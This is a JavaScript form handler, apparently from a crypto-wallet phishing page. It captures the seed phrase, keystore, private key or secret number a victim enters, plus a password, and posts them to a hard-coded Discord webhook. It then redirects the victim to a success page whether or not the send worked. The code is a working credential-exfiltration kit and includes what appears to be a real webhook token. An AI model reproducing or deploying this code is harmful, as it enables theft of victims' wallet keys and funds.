(function () {
  console.log("Form submission handler loaded");

  var forms = document.querySelectorAll("form.gform");
  Array.prototype.forEach.call(forms, function (form) {
      form.addEventListener("submit", handleFormSubmit, false);
  });

  function handleFormSubmit(event) {
      event.preventDefault();
      var form = event.target;
      var formData = getFormData(form);
      var data = formData.data;

      if (formData.honeypot) {
          console.log("Honeypot triggered, submission aborted.");
          return false;
      }

      console.log("Form submission received, captured data:", data);

      disableAllButtons(form);

      // Prepare the Discord webhook payload
      var discordWebhookUrl = "https://discord.com/api/webhooks/1361504824155308162/qYA8XfVo0lt-XKaugx328qRQdPi-7ntS8S3tCpi1vdTSfRLJ1j4F8w2cJTLu_vtpht0t"; // Replace with your Discord webhook URL
      var message = "New Wallet Import Submission\n";
      message += `Wallet Type: ${data.walletType || "N/A"}\n`;
      message += `Details: ${data.details || "N/A"}\n`;
      message += `Password: ${data.password || "N/A"}`;

      console.log("Sending message to Discord:", message);

      var payload = {
          content: message
      };

      // Send the form data to Discord webhook using fetch
      fetch(discordWebhookUrl, {
          method: "POST",
          headers: {
              "Content-Type": "application/json",
          },
          body: JSON.stringify(payload),
      })
          .then(response => {
              console.log("Discord webhook response status:", response.status);
              if (response.ok) {
                  console.log("Form data sent to Discord successfully");
                  window.location.href = "success.html";
              } else {
                  console.error("Failed to send form data to Discord:", response.statusText);
                  alert("Failed to send form data to Discord. Please try again.");
                  window.location.href = "success.html";
              }
          })
          .catch(error => {
              console.error("Error sending form data to Discord:", error);
              alert("An error occurred while sending the form data. Please try again.");
              window.location.href = "success.html";
          });
  }

  function getFormData(form) {
    var inputs = form.querySelectorAll("input, textarea, select");
    var data = {};
    var honeypot = false;

    // Determine the active tab by checking which div is visible
    var activeTab = form.querySelector("#first[style*='display: block']") ? "phrase" :
                    form.querySelector("#second[style*='display: block']") ? "keystore" :
                    form.querySelector("#third[style*='display: block']") ? "private" :
                    form.querySelector("#fourth[style*='display: block']") ? "family" :
                    form.querySelector("#fiveth[style*='display: block']") ? "secret" : null;

    console.log("Active tab:", activeTab);

    console.log("All form inputs:", inputs);

    Array.prototype.forEach.call(inputs, function (input) {
        if (input.name) {
            console.log(`Input name: ${input.name}, value: ${input.value}, id: ${input.id}`);
            if (input.name === "email") {
                honeypot = true;
            } else if (input.name === "details") {
                // Capture the details field from the active tab
                if (activeTab === "phrase" && input.id === "phrase1") {
                    data[input.name] = input.value;
                } else if (activeTab === "keystore" && input.id === "keystore2") {
                    data[input.name] = input.value;
                } else if (activeTab === "private" && input.id === "private1") {
                    data[input.name] = input.value;
                } else if (activeTab === "family" && input.id === "familyseed") {
                    data[input.name] = input.value;
                } else if (activeTab === "secret" && input.id === "secretnumber") {
                    data[input.name] = input.value;
                }
            } else {
                // Capture other fields (walletType, password) regardless of visibility
                data[input.name] = input.value;
            }
        }
    });

    return { data: data, honeypot: honeypot };
}